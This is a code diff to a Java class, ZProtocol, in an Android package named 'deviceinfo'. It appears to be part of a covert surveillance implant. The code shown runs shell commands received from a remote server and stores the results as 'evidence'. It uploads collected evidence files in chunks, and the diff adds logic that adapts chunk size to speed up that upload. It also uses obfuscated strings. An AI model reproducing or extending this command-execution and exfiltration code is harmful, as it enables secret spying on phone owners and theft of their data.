@@ -33,6 +33,7 @@ import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.ExecuteResult;
+import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
 import com.android.m.M;
 
@@ -64,7 +65,7 @@ public class ZProtocol extends Protocol {
 	 */
 	public ZProtocol() {
 		try {
-			//6_1=SHA1PRNG
+			// 6_1=SHA1PRNG
 			random = SecureRandom.getInstance(M.e("SHA1PRNG")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
 			if (Cfg.EXCEPTION) {
@@ -773,7 +774,7 @@ public class ZProtocol extends Protocol {
 					// expanding $dir$
 					file = Directory.expandMacro(file);
 					file = Protocol.normalizeFilename(file);
-					// TODO: non caricare intero il file in memoria 
+					// TODO: non caricare intero il file in memoria
 					Protocol.saveDownloadLog(file);
 				}
 
@@ -994,14 +995,14 @@ public class ZProtocol extends Protocol {
 			try {
 				final int totSize = dataBuffer.readInt();
 				final int numCommand = dataBuffer.readInt();
-				
+
 				for (int i = 0; i < numCommand; i++) {
 					String executionLine = WChar.readPascal(dataBuffer);
 					executionLine = Directory.expandMacro(executionLine);
 
 					ExecuteResult ret = Execute.execute(executionLine);
 					ret.saveEvidence();
-					
+
 				}
 
 			} catch (final IOException e) {
@@ -1025,8 +1026,6 @@ public class ZProtocol extends Protocol {
 			throw new ProtocolException();
 		}
 	}
-
-
 
 	protected void purgeEvidences(final String basePath, Date date, int size) {
 		if (Cfg.DEBUG) {
@@ -1206,9 +1205,11 @@ public class ZProtocol extends Protocol {
 					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
 		}
 
+		long timestamp = Utils.getTimeStamp();
+
 		while (base < size) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (sendResumeEvidence), base: " + base + " size: " + size);
+				Check.log(TAG + " (sendResumeEvidence), base: %s/%s block: %s", base, size, chunk);
 			}
 			byte[] content = file.read(base, chunk);
 			if (content.length < chunk) {
@@ -1216,7 +1217,7 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " (sendResumeEvidence), smaller read: " + content.length);
 				}
 			}
-			
+
 			byte[] plainOut = new byte[content.length + 16];
 
 			writeBuf(plainOut, 0, evid, 0, 4);
@@ -1242,6 +1243,10 @@ public class ZProtocol extends Protocol {
 				}
 				break;
 			}
+
+			long timelaps = Utils.getTimeStamp();
+			chunk = adaptChunk(chunk, timestamp, timelaps);
+			timestamp = timelaps;
 		}
 
 		if (full) {
@@ -1255,6 +1260,27 @@ public class ZProtocol extends Protocol {
 			return false;
 		}
 
+	}
+
+	private int adaptChunk(int chunk, long timestamp, long timelaps) {
+		if (timelaps - timestamp > 12000) {
+			if (chunk > 1024) {
+				chunk /= 2;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (sendResumeEvidence) time: %s decreasing chunk to: %s", (timelaps - timestamp),
+							chunk);
+				}
+			}
+		} else if (timelaps - timestamp < 4000) {
+			if (chunk < 4 * 1024 * 1024) {
+				chunk *= 2;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (sendResumeEvidence) time: %s increasing chunk to: %s", (timelaps - timestamp),
+							chunk);
+				}
+			}
+		}
+		return chunk;
 	}
 
 	private void writeBuf(byte[] buffer, int pos, byte[] content) {
